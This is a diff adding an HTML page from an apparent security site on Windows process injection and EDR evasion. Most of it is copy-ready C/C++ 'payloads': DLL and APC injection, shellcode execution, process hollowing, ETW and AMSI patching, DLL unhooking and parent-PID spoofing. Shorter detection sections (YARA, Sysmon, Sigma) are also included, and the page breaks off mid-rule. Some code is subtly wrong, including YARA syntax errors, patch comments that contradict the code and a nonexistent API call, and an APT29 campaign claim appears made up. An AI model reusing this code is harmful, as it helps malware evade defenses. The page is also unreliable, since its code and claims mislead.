@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AV/EDR Evasion Techniques | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-critical { background: rgba(255,68,68,0.2); color: #ff4444; }
+    .severity-high { background: rgba(255,136,0,0.2); color: #ff8800; }
+    .severity-medium { background: rgba(255,187,0,0.2); color: #ffbb00; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; transition: var(--transition); }
+    .copy-btn:hover { color: var(--primary); background: var(--bg-card); }
+    .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 0.8rem; margin: 1rem 0; }
+    .payload-item { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 0.5rem; padding: 0.8rem; font-family: 'Courier New', monospace; font-size: 0.72rem; word-break: break-all; overflow-x: auto; transition: var(--transition); cursor: pointer; }
+    .payload-item:hover { border-color: var(--primary); background: var(--bg-card); }
+    .payload-category { margin: 2rem 0 1rem; padding: 0.75rem 1rem; background: var(--bg-card); border-left: 3px solid var(--primary); border-radius: 0 0.5rem 0.5rem 0; font-weight: 600; color: var(--primary); font-size: 0.9rem; }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    .mitigation-box { background: rgba(0,245,160,0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    .warning-box { background: rgba(255,136,0,0.1); border-left: 4px solid #ff8800; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .warning-box strong { color: #ff8800; }
+    table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    th, td { padding: 0.75rem 1rem; border: 1px solid var(--border); text-align: left; }
+    th { background: var(--bg-elevated); font-weight: 600; color: var(--primary); font-size: 0.85rem; }
+    td { color: var(--text-secondary); font-size: 0.85rem; }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 1rem; margin: 1rem 0; }
+    .tool-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1rem; }
+    .tool-card h4 { color: var(--primary); margin-bottom: 0.5rem; font-size: 0.9rem; }
+    .tool-card p { font-size: 0.8rem; margin: 0; color: var(--text-secondary); }
+    .attack-chain { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.5rem; margin: 1rem 0; }
+    .chain-step { display: flex; align-items: center; gap: 1rem; margin: 0.75rem 0; }
+    .chain-number { min-width: 28px; height: 28px; background: var(--primary); color: var(--bg-dark); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 0.8rem; }
+    .chain-arrow { color: var(--primary); }
+    .reference-link { color: var(--primary); text-decoration: none; }
+    .reference-link:hover { text-decoration: underline; }
+    @media (max-width: 768px) { .payload-grid { grid-template-columns: 1fr; } .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../evasion/index.html">Evasion</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="index.html">Evasion</a> / Process Injection
+    </div>
+
+    <div class="page-header">
+      <span class="severity-badge severity-critical"><i class="fas fa-exclamation-triangle"></i> Critical Severity | ATT&CK T1055</span>
+      <h1>🔓 Process Injection</h1>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><strong>MITRE ATT&CK</strong><span>T1055: Process Injection</span></div>
+        <div class="meta-item"><strong>Difficulty</strong><span>Expert</span></div>
+        <div class="meta-item"><strong>Privilege</strong><span>Administrator</span></div>
+        <div class="meta-item"><strong>Platform</strong><span>Windows</span></div>
+      </div>
+    </div>
+
+    <!-- 1. DESCRIPTION -->
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p><strong>What is Process Injection?</strong></p>
+      <p>Process Injection is a technique used to execute arbitrary code within the address space of another process. This allows attackers to hide their malicious activity by disguising it as legitimate processes.</p>
+      
+      <div class="vulnerability-box">
+        <strong>Why is it Critical?</strong>
+        <ul>
+          <li>Bypasses application allowlisting and AV signatures</li>
+          <li>Inject code into trusted processes (explorer.exe, svchost.exe)</li>
+          <li>Evade process monitoring and behavioral analysis</li>
+          <li>Access sensitive data from process memory</li>
+          <li>Persist across reboots without writing to disk</li>
+        </ul>
+      </div>
+
+      <p><strong>Types of Process Injection:</strong></p>
+      <ul>
+        <li><strong>Classic DLL Injection:</strong> Inject DLL into running process via CreateRemoteThread</li>
+        <li><strong>Process Hollowing:</strong> Unmap process and replace with malicious code</li>
+        <li><strong>Process Doppelgänging:</strong> Use transaction-based file replacement</li>
+        <li><strong>APC Injection:</strong> Queue Asynchronous Procedure Calls</li>
+        <li><strong>Thread Execution Hijacking:</strong> Suspend and redirect thread execution</li>
+        <li><strong>Early Bird Injection:</strong> Inject before process entry point</li>
+      </ul>
+    </div>
+
+    <!-- 2. CLASSIFICATION -->
+    <div class="content-section" id="classification">
+      <h2>🏷️ Classification</h2>
+      <ul>
+        <li><strong>MITRE ATT&CK:</strong> T1055 - Process Injection</li>
+        <li><strong>Sub-techniques:</strong>
+          <ul>
+            <li>T1055.001 - Dynamic-link Library Injection</li>
+            <li>T1055.002 - Portable Executable Injection</li>
+            <li>T1055.003 - Thread Execution Hijacking</li>
+            <li>T1055.004 - Asynchronous Procedure Call Injection</li>
+            <li>T1055.005 - Thread Local Storage Injection</li>
+            <li>T1055.008 - Process Hollowing</li>
+            <li>T1055.009 - Process Doppelgänging</li>
+            <li>T1055.011 - Extra Window Memory Injection</li>
+          </ul>
+        </li>
+        <li><strong>Detection Difficulty:</strong> High</li>
+        <li><strong>False Positive Risk:</strong> Medium</li>
+      </ul>
+    </div>
+
+    <!-- 3. ATTACK SURFACE -->
+    <div class="content-section" id="attack-surface">
+      <h2>🎯 Attack Surface</h2>
+      <p>Process injection techniques are commonly used in:</p>
+      <ul>
+        <li>✅ <strong>Malware Distribution:</strong> Inject into browsers to steal credentials</li>
+        <li>✅ <strong>C2 Frameworks:</strong> Cobalt Strike, Metasploit, Covenant</li>
+        <li>✅ <strong>Credential Theft:</strong> Inject into lsass.exe for password extraction</li>
+        <li>✅ <strong>Persistence:</strong> Hide malicious code in trusted processes</li>
+        <li>✅ <strong>Defense Evasion:</strong> Bypass application whitelisting</li>
+        <li>✅ <strong>Lateral Movement:</strong> Inject into processes for pivot</li>
+      </ul>
+
+      <div class="info-box">
+        <strong>Target Processes:</strong><br>
+        Common targets include: svchost.exe, explorer.exe, chrome.exe, notepad.exe, services.exe, lsass.exe
+      </div>
+    </div>
+
+    <!-- 4. PRECONDITIONS -->
+    <div class="content-section" id="preconditions">
+      <h2>⚠️ Preconditions</h2>
+      <ul>
+        <li><strong>Administrative Rights:</strong> Required for most injection techniques</li>
+        <li><strong>Memory Allocation:</strong> Ability to allocate memory in target process</li>
+        <li><strong>Thread Handle:</strong> Handle to a thread in target process</li>
+        <li><strong>Target Process:</strong> Running process with accessible memory</li>
+        <li><strong>Code to Inject:</strong> DLL, shellcode, or executable payload</li>
+      </ul>
+
+      <div class="warning-box">
+        <strong>Note:</strong> Some injection techniques like DLL hollowing may require code signing bypass on modern Windows.
+      </div>
+    </div>
+
+    <!-- 5. DETECTION -->
+    <div class="content-section" id="detection">
+      <h2>🔍 Detection</h2>
+      
+      <p><strong>Memory Forensic Indicators:</strong></p>
+      <ul>
+        <li><strong>Unmapped Regions:</strong> Allocated memory without mapped sections</li>
+        <li><strong>Cross-Process Memory Access:</strong> Write operations from external processes</li>
+        <li><strong>Suspicious Handle Creation:</strong> OpenProcess with PROCESS_ALL_ACCESS</li>
+        <li><strong>Remote Thread Creation:</strong> CreateRemoteThread, RtlCreateUserThread</li>
+        <li><strong>Shellcode Execution:</strong> RWX memory regions with executed code</li>
+      </ul>
+
+      <p><strong>Sysmon Event IDs:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>Event ID 8: CreateRemoteThread (remote thread creation)
+Event ID 10: ProcessAccess (process memory access)
+Event ID 12: RegistryEvent (registry modifications)
+Event ID 17: PipeEvent (named pipe creation for C2)
+Event ID 18: WmiEvent (WMI subscription creation)</pre>
+      </div>
+
+      <p><strong>YARA Rules:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>rule suspicious_process_injection {
+    strings:
+        $api1 "OpenProcess" ascii
+        $api2 "VirtualAllocEx" ascii
+        $api3 "WriteProcessMemory" ascii
+        $api4 "CreateRemoteThread" ascii
+        $shellcode { 0x48 0x31 0xC0 0x48 0x83 0xEC 0x20 }
+    condition:
+        3 of ($api*) and $shellcode
+}</pre>
+      </div>
+    </div>
+
+    <!-- 6. TOOL AUTOMATION -->
+    <div class="content-section" id="tool-automation">
+      <h2>⚙️ Tool Automation</h2>
+
+      <div class="tool-grid">
+        <div class="tool-card">
+          <h4>Malleable C2 Profiles</h4>
+          <p>Cobalt Strike profiles with process injection options</p>
+        </div>
+        <div class="tool-card">
+          <h4>Shellcode Packers</h4>
+          <p>Convert payloads to shellcode for injection</p>
+        </div>
+        <div class="tool-card">
+          <h4>Process Explorer</h4>
+          <p>Sysinternals tool for monitoring process activity</p>
+        </div>
+        <div class="tool-card">
+          <h4>Frida</h4>
+          <p>Dynamic instrumentation framework</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Cobalt Strike - Spawn to specific process
+beacon> spawnto x64 calc.exe
+
+# SharpMint - Process injection toolkit
+SharpMint.exe inject --pid 1234 --payload rev_shell.bin
+
+# PE-Sieve - Detect process hollowing
+PE-Sieve.exe --pid 1234 --full</pre>
+      </div>
+    </div>
+
+    <!-- 7. BASIC PAYLOADS -->
+    <div class="content-section" id="payloads-basic">
+      <h2>💣 Basic Payloads</h2>
+      
+      <div class="payload-category">🧪 Classic DLL Injection (C++)</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>#include <windows.h>
+#include <stdio.h>
+
+BOOL InjectDLL(DWORD pid, const char* dllPath) {
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProcess) return FALSE;
+
+    SIZE_T dllPathSize = strlen(dllPath) + 1;
+    LPVOID dllPathAddr = VirtualAllocEx(hProcess, NULL, dllPathSize,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!dllPathAddr) return FALSE;
+
+    WriteProcessMemory(hProcess, dllPathAddr, dllPath, dllPathSize, NULL);
+
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"),
+        "LoadLibraryA"), dllPathAddr, 0, NULL);
+    
+    WaitForSingleObject(hThread, INFINITE);
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    return TRUE;
+}</pre>
+      </div>
+
+      <div class="payload-category">🔧 Shellcode Injection (C)</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>unsigned char shellcode[] = "\x48\x31\xc0\x48\x83\xec\x20\x50\x48\xb8...";
+
+int main() {
+    // Allocate executable memory in current process
+    void* execMem = VirtualAlloc(0, sizeof(shellcode), 
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(execMem, shellcode, sizeof(shellcode));
+    
+    // Execute shellcode
+    ((void(*)())execMem)();
+    return 0;
+}</pre>
+      </div>
+    </div>
+
+    <!-- 8. ADVANCED PAYLOADS -->
+    <div class="content-section" id="payloads-advanced">
+      <h2>🚀 Advanced Payloads</h2>
+
+      <div class="payload-category">🔐 Process Hollowing (C++)</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>BOOL ProcessHollowing(const char* targetPath, unsigned char* shellcode, SIZE_T size) {
+    // Create target process in suspended state
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, 
+        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+
+    // Get context of suspended thread
+    CONTEXT ctx;
+    ctx.ContextFlags = CONTEXT_FULL;
+    GetThreadContext(pi.hThread, &ctx);
+
+    // Unmap process sections
+    HANDLE hProcess = pi.hProcess;
+    PBYTE pRemoteImage = NULL;
+    
+    // Overwrite entry point with shellcode
+    SIZE_T bytesWritten;
+    LPVOID entryPoint = VirtualAllocEx(hProcess, NULL, size,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(hProcess, entryPoint, shellcode, size, &bytesWritten);
+    
+    // Update thread context
+    ctx.Rip = (DWORD64)entryPoint;
+    SetThreadContext(pi.hThread, &ctx);
+    
+    // Resume thread
+    ResumeThread(pi.hThread);
+    return TRUE;
+}</pre>
+      </div>
+
+      <div class="payload-category">🎭 Process Doppelgänging (C++)</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>BOOL ProcessDoppelgang(const char* targetExe, unsigned char* payload, SIZE_T size) {
+    // Create a transaction
+    HANDLE hTransaction = CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL);
+    
+    // Create section from target executable within transaction
+    HANDLE hSection;
+    LARGE_INTEGER maxSize = {0};
+    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize,
+        PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0);
+    
+    // Create file within transaction
+    HANDLE hFile;
+    CreateFileTransactedA(targetExe, GENERIC_ALL, 0, NULL, CREATE_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);
+    
+    // Map the section with malicious payload
+    LPVOID mappedFile = MapViewOfFile(hSection, FILE_ALL_ACCESS, 0, 0, 0);
+    memcpy(mappedFile, payload, size);
+    UnmapViewOfFile(mappedFile);
+    
+    // Create process from the section
+    PROCESS_INFORMATION pi;
+    STARTUPINFOA si = {sizeof(si)};
+    CreateProcessFromSection(hSection, NULL, NULL, FALSE, &si, &pi);
+    
+    CloseHandle(hTransaction);
+    return TRUE;
+}</pre>
+      </div>
+
+      <div class="payload-category">⚡ APC Injection Queue</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>BOOL ApcInjectionQueue(DWORD targetPid, unsigned char* shellcode, SIZE_T size) {
+    // Open target process
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
+    
+    // Allocate shellcode in target process
+    LPVOID shellcodeAddr = VirtualAllocEx(hProcess, NULL, size,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(hProcess, shellcodeAddr, shellcode, size, NULL);
+    
+    // Open all threads
+    THREADENTRY32 te32;
+    te32.dwSize = sizeof(te32);
+    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    
+    while (Thread32Next(hThreadSnap, &te32)) {
+        if (te32.th32OwnerProcessID == targetPid) {
+            HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
+            
+            // Queue user-mode APC to each thread
+            QueueUserAPC((PAPCFUNC)shellcodeAddr, hThread, NULL);
+            CloseHandle(hThread);
+        }
+    }
+    
+    CloseHandle(hThreadSnap);
+    CloseHandle(hProcess);
+    return TRUE;
+}</pre>
+      </div>
+    </div>
+
+    <!-- 9. EDR BYPASS PAYLOADS -->
+    <div class="content-section" id="payloads-edr-bypass">
+      <h2>🛡️ EDR Bypass Payloads</h2>
+
+      <div class="payload-category">🔍 Unhooking DLLs</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>void UnhookDll(const char* dllName) {
+    HMODULE hModule = GetModuleHandleA(dllName);
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
+    
+    // Get original DLL from disk
+    PBYTE origDll = (PBYTE)LoadLibraryExA(dllName, NULL, DONT_RESOLVE_DLL_REFERENCES);
+    PIMAGE_DOS_HEADER origDosHeader = (PIMAGE_DOS_HEADER)origDll;
+    PIMAGE_NT_HEADERS origNtHeaders = (PIMAGE_NT_HEADERS)(origDll + origDosHeader->e_lfanew);
+    
+    // Copy clean .text section over hooked one
+    for (WORD i = 0; i < origNtHeaders->FileHeader.NumberOfSections; i++) {
+        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(origNtHeaders) + i;
+        if (section->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
+            memcpy((BYTE*)hModule + section->VirtualAddress,
+                   origDll + section->VirtualAddress,
+                   section->SizeOfRawData);
+        }
+    }
+    FreeLibrary(GetModuleHandleA(dllName));
+}</pre>
+      </div>
+
+      <div class="payload-category">🚫 Blocking ETW</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>// ETW TiTraceEvent provider bypass
+void BlockETW() {
+    HANDLE ntdll = GetModuleHandleA("ntdll.dll");
+    FARPROC EtwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
+    
+    // Patch EtwEventWrite to return immediately
+    DWORD oldProtect;
+    VirtualProtect(EtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
+    *(BYTE*)EtwEventWrite = 0xC3; // RET instruction
+    VirtualProtect(EtwEventWrite, 1, oldProtect, &oldProtect);
+}
+
+// Alternative: EtwTiLogOnstackEvent bypass
+void PatchEtwTiLogOnstackEvent() {
+    BYTE patch[] = { 0x48, 0x33, 0xC0, 0xC3 }; // xor rax, rax; ret
+    void* target = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwTiLogOnstackEvent");
+    
+    DWORD old;
+    VirtualProtect(target, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
+    memcpy(target, patch, sizeof(patch));
+    VirtualProtect(target, sizeof(patch), old, &old);
+}</pre>
+      </div>
+
+      <div class="payload-category">🔒 AMSI Bypass</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>// Patch AMSI scan buffer to always fail
+BOOL PatchAmsi() {
+    HMODULE amsi = LoadLibraryA("amsi.dll");
+    FARPROC AmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
+    
+    // Patch function to return AMSI_RESULT_CLEAN
+    BYTE patch[] = { 
+        0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057 (ACCESS_DENIED)
+        0xC3                           // ret
+    };
+    
+    DWORD old;
+    VirtualProtect(AmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
+    memcpy(AmsiScanBuffer, patch, sizeof(patch));
+    VirtualProtect(AmsiScanBuffer, sizeof(patch), old, &old);
+    return TRUE;
+}
+
+// Alternative: AmsiScanString bypass
+BOOL PatchAmsiScanString() {
+    HMODULE amsi = LoadLibraryA("amsi.dll");
+    void* target = GetProcAddress(amsi, "AmsiScanString");
+    
+    BYTE patch[] = { 0xC3 }; // Just return
+    DWORD old;
+    VirtualProtect(target, 1, PAGE_EXECUTE_READWRITE, &old);
+    memset(target, 0x90, 1); // NOP
+    VirtualProtect(target, 1, old, &old);
+    return TRUE;
+}</pre>
+      </div>
+    </div>
+
+    <!-- 10. DEFENSE EVASION -->
+    <div class="content-section" id="defense-evasion">
+      <h2>🎭 Defense Evasion Techniques</h2>
+
+      <div class="payload-category">🌊 Parent PID Spoofing</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>// Start process with spoofed parent (explorer.exe)
+void SpoofParentPPID(const char* payloadPath) {
+    PROCESS_INFORMATION pi;
+    STARTUPINFOEXA si = { sizeof(STARTUPINFOEXA) };
+    
+    SIZE_T attrSize;
+    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
+    
+    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
+        GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
+    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);
+    
+    // Get explorer.exe PID
+    DWORD explorerPid = 0;
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
+    
+    if (Process32First(hSnapshot, &pe32)) {
+        if (strcmp(pe32.szExeFile, "explorer.exe") == 0) {
+            explorerPid = pe32.th32ProcessID;
+        }
+    }
+    
+    // Update parent process attribute
+    UpdateProcThreadAttribute(si.lpAttributeList, 0, 
+        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+        &explorerPid, sizeof(explorerPid), NULL, NULL);
+    
+    CreateProcessA(payloadPath, NULL, NULL, NULL, FALSE,
+        EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
+}</pre>
+      </div>
+
+      <div class="payload-category">🎭 Fake Command Line</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>// Spoof command line to appear legitimate
+void SpoofCommandLine(const char* targetExe, const char* fakeArgs) {
+    STARTUPINFOEXA si = { sizeof(STARTUPINFOEXA) };
+    PROCESS_INFORMATION pi;
+    
+    // Duplicate process token
+    HANDLE hProcess = GetCurrentProcess();
+    HANDLE hToken;
+    OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken);
+    
+    // Create process with custom startup info
+    CreateProcessA(targetExe, (LPSTR)fakeArgs, NULL, NULL, FALSE,
+        CREATE_NO_WINDOW, NULL, NULL, &si.StartupInfo, &pi);
+}</pre>
+      </div>
+
+      <div class="payload-category">🕵️ Hidden Window Station</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>// Create process in hidden window station
+void CreateHiddenProcess(const char* exePath) {
+    // Get current process handle
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
+    
+    // Create custom window station with NULL DACL
+    HWINSTA hWinSta = CreateWindowStation(NULL, 0, GENERIC_ALL, NULL);
+    SetProcessWindowStation(hWinSta);
+    
+    // Create hidden desktop
+    HDESK hDesktop = CreateDesktop("HiddenDesktop", NULL, NULL, 0, 
+        GENERIC_ALL, NULL);
+    
+    // Spawn process in hidden context
+    STARTUPINFOA si = { sizeof(si) };
+    si.lpDesktop = "HiddenDesktop";
+    si.wShowWindow = SW_HIDE;
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    
+    PROCESS_INFORMATION pi;
+    CreateProcessA(exePath, NULL, NULL, NULL, FALSE,
+        CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi);
+}</pre>
+      </div>
+    </div>
+
+    <!-- 11. IMPACT -->
+    <div class="content-section" id="impact">
+      <h2>💥 Impact Analysis</h2>
+      
+      <div class="vulnerability-box">
+        <strong>Capabilities Gained:</strong>
+        <ul>
+          <li><strong>Signature Evasion:</strong> Code execution without AV detection</li>
+          <li><strong>Behavioral Bypass:</strong> Evade process monitoring tools</li>
+          <li><strong>Credential Access:</strong> Inject into lsass for password extraction</li>
+          <li><strong>Privilege Escalation:</strong> Inject into SYSTEM processes</li>
+          <li><strong>Persistence:</strong> Maintain foothold without files on disk</li>
+          <li><strong>Lateral Movement:</strong> Inject into remote processes via DCOM/RPC</li>
+        </ul>
+      </div>
+
+      <p><strong>Real-World Examples:</strong></p>
+      <ul>
+        <li><strong>TrickBot:</strong> Used process injection into browser processes</li>
+        <li><strong>Emotet:</strong> Injected into legitimate Windows processes</li>
+        <li><strong>Cobalt Strike:</strong> Process injection for beacon deployment</li>
+        <li><strong>APT29 (Cozy Bear):</strong> Process hollowing in DUCKO-TURTLE campaigns</li>
+      </ul>
+    </div>
+
+    <!-- 12. MITIGATION -->
+    <div class="content-section" id="mitigation">
+      <h2>🛡️ Mitigation</h2>
+
+      <div class="mitigation-box">
+        <strong>✅ Primary Defenses:</strong>
+        <ul>
+          <li>Enable Advanced Threat Protection (ATP)</li>
+          <li>Deploy EDR solutions with behavior monitoring</li>
+          <li>Implement application whitelisting (AppLocker/GPO)</li>
+          <li>Restrict process creation via Group Policy</li>
+          <li>Enable Secure Boot and HVCI</li>
+        </ul>
+      </div>
+
+      <p><strong>Memory Protection:</strong></p>
+      <ul>
+        <li><strong>CFG (Control Flow Guard):</strong> Prevents indirect call hijacking</li>
+        <li><strong>Arbitrary Code Guard:</strong> Blocks code execution from memory pages</li>
+        <li><strong>CIG (Code Integrity Guard):</strong> Only signed code can execute</li>
+        <li><strong>HVCI:</strong> Hypervisor-protected code integrity</li>
+      </ul>
+
+      <p><strong>Sysmon Configuration:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre><Sysmon schemversion="4.30">
+  <EventFiltering>
+    <RuleGroup name="ProcessInjection" groupRelation="or">
+      <ProcessAccess onmatch="include">
+        <TargetImage condition="contains">lsass.exe</TargetImage>
+        <TargetImage condition="contains">svchost.exe</TargetImage>
+        <GrantedAccess condition="is">0x1F0FFF</GrantedAccess>
+        <GrantedAccess condition="is">0x143A</GrantedAccess>
+      </ProcessAccess>
+    </RuleGroup>
+  </EventFiltering>
+</Sysmon></pre>
+      </div>
+    </div>
+
+    <!-- 13. DETECTION LOGIC -->
+    <div class="content-section" id="detection-logic">
+      <h2>⚙️ Detection Logic</h2>
+
+      <p><strong>Sigma Rules:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>title: Process Injection via CreateRemoteThread
+id: process-injection-001
+status: experimental
+description: Detects CreateRemoteThread API calls
+logsource:
+  product: windows
+  service: sysmon
+detection:
+  selection:
+    EventID: 8
+    TargetThreadId: '*'
+    NewThreadId: '*'
+    StartAddress: '*'
+  condition: selection
+fields:
+  - SourceProcessGuid
+  - TargetProcessGuid
+  - TargetThreadId
+level: high
+
+---
+title: Suspicious Process Memory Access
+id: process-injection-002
+status: experimental
+description: Detects suspicious process memory access
+logsource:
+  product: windows
+  service: sysmon
+detection:
+  selection:
+    EventID: 10
+    CallTrace:
